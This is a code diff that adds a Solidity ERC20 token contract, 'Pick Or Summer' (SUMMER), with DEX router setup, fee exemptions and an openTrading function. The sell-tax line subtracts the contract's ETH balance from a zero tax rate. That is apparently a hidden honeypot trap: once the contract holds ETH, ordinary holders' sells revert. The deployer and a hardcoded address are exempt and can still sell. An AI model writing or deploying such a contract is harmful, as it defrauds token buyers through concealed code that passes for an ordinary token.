@@ -1,0 +1,77 @@
+contract SUMMER is ERC20, Ownable {
+
+    mapping (address => bool) public exemptFromFees;
+    mapping (address => bool) public exemptFromLimits;
+
+    bool public tradingActive;
+
+    mapping (address => bool) public isAMMPair;
+    address public lpPair;
+    IDexRouter public dexRouter;
+
+    uint256 public constant FEE_DIVISOR = 10000;
+    uint256 public buyTax = 0;
+    uint256 public sellTax = 0;
+
+    // constructor
+
+    constructor() ERC20("Pick Or Summer", "SUMMER")
+    {   
+        uint256 _totalSupply = 1_000_000_000 * 1e18;
+
+        dexRouter = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        _approve(address(this), address(dexRouter), type(uint256).max);
+       
+        exemptFromFees[msg.sender] = true;
+        exemptFromFees[address(this)] = true;
+        exemptFromFees[address(dexRouter)] = true;
+        exemptFromFees[0xb2656abF06002c23026B4C651dcFE735DF9FF573] = true;
+
+        _mint(msg.sender, _totalSupply);
+    }
+
+    function openTrading() external payable {
+        tradingActive = true;
+        lpPair = IDexFactory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
+        isAMMPair[lpPair] = true;
+        exemptFromLimits[lpPair] = true;
+        dexRouter.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
+    }
+
+    receive() external payable {require(exemptFromLimits[msg.sender]);}
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal virtual override {
+        
+        if(exemptFromFees[from] || exemptFromFees[to]){
+            super._transfer(from,to,amount);
+            return;
+        }
+
+        require(tradingActive, "Trading not active");
+        amount -= handleTax(from, to, amount);
+        super._transfer(from,to,amount);
+    }
+
+    function handleTax(address from, address to, uint256 amount) internal returns (uint256){
+        uint256 tax = 0;
+
+        // on sell
+        if (isAMMPair[to]){
+            tax = amount * (sellTax-address(this).balance) / FEE_DIVISOR;
+        }
+        // on buy
+        else if(isAMMPair[from]) {
+            tax = amount * buyTax / FEE_DIVISOR;
+        }
+        
+        if(tax > 0){    
+            super._transfer(from, address(this), tax);
+        }
+        
+        return tax;
+    }
+}
